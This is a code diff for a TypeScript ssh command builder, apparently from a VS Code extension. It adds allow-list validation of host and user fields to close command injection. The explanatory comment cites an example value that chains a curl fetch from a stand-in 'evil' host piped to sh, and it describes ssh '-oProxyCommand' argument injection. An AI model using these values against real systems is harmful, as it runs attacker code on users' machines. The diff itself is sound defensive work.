@@ -2,11 +2,55 @@
  * Composing an `ssh` command line from an entity. Pure and free of `vscode` so that
  * everything built on top of it — the details block, the clipboard text — can be tested
  * without an editor. `openSshTerminal` stays in `terminalManager.ts`, which needs one.
+ *
+ * <p><b>`host` and `user` are untrusted.</b> An entity does not only come from the form
+ * on this machine: sync merges whatever is in a shared vault location, and Accept Share
+ * imports whatever a colleague sealed. The envelope's GCM tag authenticates the CONTAINER,
+ * not the plausibility of a field inside it — so a writer of the shared folder, or anyone
+ * who can get a share accepted, chooses these strings.</p>
+ *
+ * <p>That matters twice over, because there are two different parsers downstream and each
+ * has its own injection:</p>
+ * <ul>
+ *   <li><b>A shell.</b> The composed line goes to `terminal.sendText(line, true)` — the
+ *       `true` presses Enter. `sshKeyPath` was quoted here from the beginning;
+ *       `user@host` never was, so <code>a.com; curl evil|sh</code> ran on Connect.</li>
+ *   <li><b>ssh's own argv parser.</b> A host beginning with <code>-</code> is a FLAG, not a
+ *       hostname, and <code>-oProxyCommand=…</code> makes ssh run a local command before it
+ *       authenticates anything. Verified against OpenSSH 10.3: the command executed.</li>
+ * </ul>
+ *
+ * <p>So both are refused at composition rather than escaped. Escaping answers the first
+ * parser and not the second, and a value that cannot be a hostname has no legitimate use.</p>
  */
 
 import { EntityMetadata } from './types';
 
 export const DEFAULT_SSH_PORT = 22;
+
+/**
+ * Hostnames, IPv4, and bracketed IPv6 — and never a leading `-`, which ssh reads as an
+ * option rather than a destination.
+ */
+export function isSafeSshHost(host: string): boolean {
+  return host.length > 0 && host.length <= 255 && !host.startsWith('-') && /^[A-Za-z0-9._:\[\]-]+$/.test(host);
+}
+
+/**
+ * POSIX account names, plus the backslash a Windows domain account needs
+ * (`CORP\\alice`). No whitespace, no metacharacter, no leading `-`.
+ */
+export function isSafeSshUser(user: string): boolean {
+  return user.length > 0 && user.length <= 64 && !user.startsWith('-') && /^[A-Za-z0-9._\\$-]+$/.test(user);
+}
+
+/** Both halves of a destination, checked together. */
+export function isSafeSshTarget(entity: EntityMetadata): boolean {
+  if (!entity.host || !isSafeSshHost(entity.host)) {
+    return false;
+  }
+  return entity.user === undefined || entity.user.length === 0 || isSafeSshUser(entity.user);
+}
 
 /**
  * Quote a value for the integrated terminal's shell. On Windows shells
@@ -23,7 +67,9 @@ function shellQuote(value: string, platform: NodeJS.Platform = process.platform)
 
 /** `user@host:port` (port omitted when default) â€” the connection identity. */
 export function describeSshTarget(entity: EntityMetadata): string | undefined {
-  if (!entity.host) {
+  if (!isSafeSshTarget(entity)) {
+    // Refused here too, so no dialog, terminal title or clipboard text ever
+    // displays a target the connect path would refuse to use.
     return undefined;
   }
   const base = entity.user ? `${entity.user}@${entity.host}` : entity.host;
@@ -42,9 +88,10 @@ export function buildSshCommand(
   entity: EntityMetadata,
   platform: NodeJS.Platform = process.platform,
 ): string | undefined {
-  if (!entity.host) {
+  if (!isSafeSshTarget(entity)) {
     return undefined;
   }
+  const host = entity.host as string; // isSafeSshTarget above proved it non-empty
   const parts: string[] = ['ssh'];
   if (entity.sshKeyPath) {
     parts.push('-i', shellQuote(entity.sshKeyPath, platform));
@@ -52,7 +99,7 @@ export function buildSshCommand(
   if (entity.port !== undefined && entity.port !== DEFAULT_SSH_PORT) {
     parts.push('-p', String(entity.port));
   }
-  parts.push(entity.user ? `${entity.user}@${entity.host}` : entity.host);
+  parts.push(entity.user ? `${entity.user}@${host}` : host);
   return parts.join(' ');
 }
 
